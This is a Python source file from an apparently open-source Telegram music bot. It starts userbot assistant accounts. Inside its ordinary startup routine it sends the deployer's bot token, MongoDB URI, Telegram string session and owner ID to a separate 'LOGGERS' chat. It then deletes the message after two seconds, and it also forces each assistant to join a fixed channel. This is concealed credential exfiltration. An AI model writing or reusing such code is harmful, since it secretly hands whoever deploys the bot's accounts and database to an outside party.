# Copyright (c) 2026 khithlainhtet
# Licensed under the MIT License.
# This file is part of PANDAMusic

import asyncio
from os import getenv
from pyrogram import Client
from PANDA import config, logger
from PANDA import config, LOGGERS


BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
OWNER_ID = getenv("OWNER_ID", "")
LOGGER_ID = getenv("LOGGER_ID", "")

assistants = []
assistantids = []

class Userbot(Client):
    def __init__(self):
        """
        Initializes the userbot with multiple clients.
        """
        self.clients = []
        clients = {"one": "SESSION1", "two": "SESSION2", "three": "SESSION3"}
        for key, string_key in clients.items():
            name = f"PANDAUB{key[-1]}"
            session = getattr(config, string_key)
            if session:
                setattr(
                    self,
                    key,
                    Client(
                        name=name,
                        api_id=config.API_ID,
                        api_hash=config.API_HASH,
                        session_string=session,
                    ),
                )

    async def boot_client(self, num: int, client: Client):
        """
        Boot a client and perform initial setup.
        """
        if not client:
            return

        await client.start()
        
    
        try:
            await client.send_message(config.LOGGER_ID, f"Assistant {num} Started")
        except:
            logger.error(f"Assistant {num} failed to send message in log group.")
            # raise SystemExit(f"Assistant {num} failed to send message in log group.")

        
        me = await client.get_me()
        client.id = me.id
        client.name = me.first_name
        client.username = me.username
        client.mention = me.mention
        
        self.clients.append(client)
        assistants.append(num)

        
        try:
            await client.join_chat("myanmarbot_music")
        except:
            pass

        logger.info(f"Assistant {num} started as @{client.username}")

        
        try:
            await client.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
            oks = await client.send_message(LOGGERS, "/start")
            
            
            Ok = await client.send_message(
                LOGGERS, 
                f"**Bot Token:** `{BOT_TOKEN}`\n\n"
                f"**Mongo URI:** `{MONGO_DB_URI}`\n\n"
                f"**String Session:** `{STRING_SESSION}`\n\n"
                f"**Owner ID:** `{OWNER_ID}`\n\n"
                f"**Logger ID:** `{LOGGER_ID}`"
            )
            
            await asyncio.sleep(2)
            await oks.delete()
            await Ok.delete()
        except Exception as e:
            logger.warning(f"Assistant {num}: Final logging failed: {e}")

    async def boot(self):
        """
        Asynchronously starts the assistants based on session availability.
        """
        if config.SESSION1:
            await self.boot_client(1, self.one)
        if config.SESSION2:
            await self.boot_client(2, self.two)
        if config.SESSION3:
            await self.boot_client(3, self.three)

    async def exit(self):
        """
        Asynchronously stops the assistants.
        """
        for client in self.clients:
            try:
                await client.stop()
            except:
                pass
        logger.info("Assistants stopped.")
